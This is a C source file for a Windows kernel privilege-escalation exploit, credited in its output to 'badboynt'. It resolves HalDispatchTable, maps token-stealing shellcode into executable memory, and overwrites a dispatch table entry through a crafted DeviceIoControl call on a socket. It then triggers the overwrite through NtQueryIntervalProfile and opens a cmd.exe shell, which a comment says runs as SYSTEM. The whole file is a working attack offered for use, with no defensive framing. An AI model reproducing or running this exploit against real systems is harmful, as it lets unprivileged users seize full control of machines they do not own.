#include <afxwin.h>
#include <stdio.h> 
#include <Psapi.h>
#pragma comment(lib,"psapi.lib")
#pragma comment (lib, "ntdll.lib")
#pragma comment (lib, "user32.lib") 



#define DRIVERCOUNT 1024
#define DRIVERNAMESIZE 256
#define MEMRES (0x1000 | 0x2000)
#define PAGEEXE 0x00000040

typedef enum _KPROFILE_SOURCE {
	ProfileTime,
	ProfileAlignmentFixup,
	ProfileTotalIssues,
	ProfilePipelineDry,
	ProfileLoadInstructions,
	ProfilePipelineFrozen,
	ProfileBranchInstructions,
	ProfileTotalNonissues,
	ProfileDcacheMisses,
	ProfileIcacheMisses,
	ProfileCacheMisses,
	ProfileBranchMispredictions,
	ProfileStoreInstructions,
	ProfileFpInstructions,
	ProfileIntegerInstructions,
	Profile2Issue,
	Profile3Issue,
	Profile4Issue,
	ProfileSpecialInstructions,
	ProfileTotalCycles,
	ProfileIcacheIssues,
	ProfileDcacheAccesses,
	ProfileMemoryBarrierCycles,
	ProfileLoadLinkedIssues,
	ProfileMaximum
} KPROFILE_SOURCE, *PKPROFILE_SOURCE;
typedef DWORD (WINAPI *_NtQueryIntervalProfile)( KPROFILE_SOURCE ProfileSource, PULONG Interval );
typedef LONG NTSTATUS;
typedef NTSTATUS (NTAPI *PNTALLOCATE)(HANDLE ProcessHandle, 
									  PVOID *BaseAddress, 
									  ULONG ZeroBits, 
									  PULONG RegionSize, 
									  ULONG AllocationType, 
									  ULONG Protect ); 
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation=11, 
} SYSTEM_INFORMATION_CLASS;
typedef struct _IMAGE_FIXUP_ENTRY {
	WORD offset:12; 
	WORD type:4; 
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;
typedef struct _SYSTEM_MODULE_INFORMATION { // Information Class 11
	ULONG Reserved[2]; 
	PVOID Base; 
	ULONG Size; 
	ULONG Flags; 
	USHORT Index; 
	USHORT Unknown; 
	USHORT LoadCount; 
	USHORT ModuleNameOffset; 
	CHAR ImageName[256]; 
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;


#define STATUS_SUCCESS ((NTSTATUS)0x00000000L) 
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

extern "C" NTSTATUS NTAPI NtAllocateVirtualMemory( 
	IN HANDLE ProcessHandle, 
	IN OUT PVOID *BaseAddress, 
	IN ULONG ZeroBits, 
	IN OUT PULONG AllocationSize, 
	IN ULONG AllocationType, 
	IN ULONG Protect 
	);
extern "C" NTSTATUS NTAPI NtQuerySystemInformation( 
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass, 
	IN OUT PVOID SystemInformation, 
	IN ULONG SystemInformationLength, 
	OUT PULONG ReturnLength OPTIONAL 
	);
extern "C" PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader ( 
	IN PVOID Base 
	);
extern "C" PVOID NTAPI RtlImageDirectoryEntryToData ( 
	IN PVOID Base, 
	IN BOOLEAN MappedAsImage, 
	IN USHORT DirectoryEntry, 
	OUT PULONG Size 
	);




DWORD PsReferencePrimaryToken = 0; 
DWORD PsInitialSystemProcess = 0; 
DWORD IoThreadToProcess = 0;

FARPROC GetFunctionAddress(LPCSTR libraryName, LPCSTR functionName) {
	HMODULE hModule;
	hModule = LoadLibrary(libraryName);
	if(hModule==NULL)
		return NULL;

	return GetProcAddress(hModule,functionName);
}


LPVOID findSysBase(char* driver){
	LPVOID drivers[DRIVERCOUNT];
	DWORD cbNeeded;
	CHAR driverName[DRIVERNAMESIZE];
	DWORD index;
	DWORD driverCount;

	if(EnumDeviceDrivers(drivers,DRIVERCOUNT,&cbNeeded) && cbNeeded<DRIVERCOUNT){

		driverCount = cbNeeded /sizeof(drivers[0]);

		for(index=0;index<driverCount;index++){
			memset(driverName,0,DRIVERNAMESIZE);
			if(GetDeviceDriverBaseNameA(drivers[index],driverName,DRIVERNAMESIZE)>0){
				if(!stricmp(driver, driverName)){
					return drivers[index];
				}
			}
		}
	}

	return NULL;
}
char* findKernelVersion(){
	LPVOID drivers[DRIVERCOUNT];
	DWORD cbNeeded;
	DWORD index;
	DWORD driverCount;

	char* driverName = (char*)calloc(DRIVERNAMESIZE,sizeof(CHAR));

	if(EnumDeviceDrivers(drivers,DRIVERCOUNT,&cbNeeded) && cbNeeded<DRIVERCOUNT){       
		driverCount = cbNeeded /sizeof(drivers[0]);
		for(index=0;index<driverCount;index++){
			memset(driverName,0,DRIVERNAMESIZE);
			if(GetDeviceDriverBaseNameA(drivers[index],driverName,DRIVERNAMESIZE)>0){
				if(strstr(driverName,"krnl")){
					return driverName;
				}
			}
		}
	}
	return NULL;
}



void InitTrampoline() 
{
	PNTALLOCATE NtAllocateVirtualMemory; 
	LPVOID addr = (LPVOID)0x02070000; 
	DWORD dwShellSize=0x2000; 




	unsigned char trampoline[]= 
		"\x60\x9C\xBE\x56\x34\x12\x80\xAC\x3C\x8D\x75\xFB\x8B\x7E\x01\x22" 
		"\x46\x03\x74\x03\x8B\x7E\xFB\x8B\x35\x56\x34\x12\x80\x64\xa1\x1c" 
		"\x00\x00\x00\xff\xb0\x24\x01\x00\x00\xB8\x56\x34\x12\x80\xFF\xD0"
		"\x03\xF7\x03\xF8\xA5\x9D\x61\xC2\x08\x00";

	NtAllocateVirtualMemory = (PNTALLOCATE) GetProcAddress(GetModuleHandle("ntdll.dll"),"NtAllocateVirtualMemory");
	if( !NtAllocateVirtualMemory ) 
		exit(0);

	if ( VirtualAlloc( (PVOID)0x02070000, 0x20000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE ) == NULL )
    { 
		printf("\n[++] Error Allocating memory\n"); 
		exit(0); 
	}
	*(DWORD*)(trampoline+3)=PsReferencePrimaryToken; 
	*(DWORD*)(trampoline+0x19)=PsInitialSystemProcess; 
	*(DWORD*)(trampoline+0x2a)=IoThreadToProcess; 
	memset((PVOID)0x02070000,0x90,0x20000);
	memcpy((PVOID)0x02080000,trampoline,sizeof(trampoline)-1); 
}



int main(int argc, char **argv) 
{




	printf("\n\t exploit made by badboynt \n"); 


	HMODULE hKernel; 
	STARTUPINFOA stStartup; 
	PROCESS_INFORMATION pi;
	LPVOID halBase; 
	int krnlBase;
	int HaliQuerySystemInformation, HalpSetSystemInformation, HalDispatchTable; 
	int regionSize = 0x1000;
	int baseAddr = 0x1001;

	hKernel = LoadLibraryEx(findKernelVersion(),NULL,DONT_RESOLVE_DLL_REFERENCES);
	krnlBase = (int)findSysBase(findKernelVersion());
	HalDispatchTable = (int)GetProcAddress(hKernel,"HalDispatchTable");

	HalDispatchTable -= (int)hKernel;
	HalDispatchTable += krnlBase;

	printf("[*] HalDispatchTable Address 0x%08x\n",HalDispatchTable);

	halBase = findSysBase("hal.dll");


	HaliQuerySystemInformation = (int)halBase + 0x16bba;
	HalpSetSystemInformation = (int)halBase + 0x19436;
	


	printf("[*] HaliQuerySystemInformation address 0x%08x\n",HaliQuerySystemInformation);
	printf("[*] HalpSetSystemInformation address 0x%08x\n",HalpSetSystemInformation);






	PsReferencePrimaryToken = (DWORD)GetProcAddress( hKernel, "PsReferencePrimaryToken" )-(DWORD)hKernel+krnlBase; 
	PsInitialSystemProcess = (DWORD)GetProcAddress( hKernel, "PsInitialSystemProcess" )-(DWORD)hKernel+krnlBase; 
	IoThreadToProcess = (DWORD)GetProcAddress( hKernel, "IoThreadToProcess" )-(DWORD)hKernel+krnlBase; 
	InitTrampoline();

	_NtQueryIntervalProfile NtQueryIntervalProfile;

	NtQueryIntervalProfile = (_NtQueryIntervalProfile) GetFunctionAddress("ntdll.dll","NtQueryIntervalProfile");
	if(!NtQueryIntervalProfile){
		fprintf(stderr, "GetProcAddress() failed");
		exit(1);
	}

	///////////////////////////////////////////////////////////////////////////////////////

	printf("\n[+] Executing Shellcode...\n");

  WSADATA ws;

  SOCKET tcp_socket;
  struct sockaddr_in peer;
  ULONG  dwReturnSize;

  WSAStartup(0x0202,&ws);

  peer.sin_family = AF_INET;
  peer.sin_port = htons(4455);
  peer.sin_addr.s_addr = inet_addr( "127.0.0.1" );

  tcp_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  if ( connect(tcp_socket, (struct sockaddr*) &peer, sizeof(struct sockaddr_in)) )
  {
    printf("connect error\n");
  }

  UCHAR  buf1[26]= "\x41\x41\x41\x41\x42\x42\x42\x42\x00\x00\x00\x00\x44\x44\x44\x44\x01\x00\x00\x00\xe8\x00\x34\xf0\x00";
  UCHAR buf2[1000];

  memset(buf2,0x45,0x108);
  memcpy(buf2,buf1,25);
  
  if(!DeviceIoControl((HANDLE)tcp_socket,0x000120bb, (PVOID)(buf2+4), 0x108, (PVOID)(HalDispatchTable+6), 0x0,&dwReturnSize, NULL))
  {
    printf("error=%d\n", GetLastError());
  }

  //´¥·¢£¬µ¯³öSYSTEMµÄCMD
  ULONG result;
  NtQueryIntervalProfile((KPROFILE_SOURCE)0x1337,&result);
	ShellExecute( NULL, "open", "cmd.exe", NULL, NULL, SW_SHOW);


	////////////////////////////////////////////////////////////////////////////////////////////////


	printf("[+] Exiting...\n");
	return TRUE; 
}